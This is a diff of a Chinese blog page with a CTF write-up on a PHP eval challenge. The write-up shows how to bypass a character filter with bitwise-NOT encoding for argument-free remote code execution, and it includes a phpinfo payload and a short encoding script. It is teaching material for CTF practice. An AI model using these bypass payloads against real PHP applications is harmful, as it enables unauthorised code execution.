@@ -199,7 +199,7 @@
         <p>前日，Gq师傅出了一道简单的web题，做完后简析一下</p>
 <span id="more"></span>
 
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a><strong>题目</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a><strong>题目</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
 <p>题目对数字，字母都进行了过滤，还对传入的字符串进行了限制，不得长于70，且过滤了<code>^</code>，因此考虑取反绕过，还对传入<code>code</code>进行了正则匹配</p>
 <h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>根据Gq师傅给出的小tips</p>
@@ -211,12 +211,12 @@
 </ul>
 </blockquote>
 <p><img src="/2020/12/16/%E8%A7%A3%E6%9E%90%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E5%8F%96%E5%8F%8D%E4%B8%8E%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE/2.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%8F%97%8F%96%91%99%90][!%FF]();</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%8F%97%8F%96%91%99%90][!%FF]();</span><br></pre></td></tr></table></figure>
 
 <p>这个payload是对<code>phpinfo</code>取反后构建的字符串</p>
 <p><img src="/2020/12/16/%E8%A7%A3%E6%9E%90%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E5%8F%96%E5%8F%8D%E4%B8%8E%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE/3.png"></p>
 <p>附取反脚本</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = (~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = (~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目多重套娃，典型的无参数RCE题目，且过滤了<code>^</code>，因此考虑取反绕过</p>
 <p>我们可以用<code>getallheaders()</code>来解题</p>
@@ -503,18 +503,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -524,6 +512,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CSP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
               </li>
              
               <li class="article-tag-list-item">
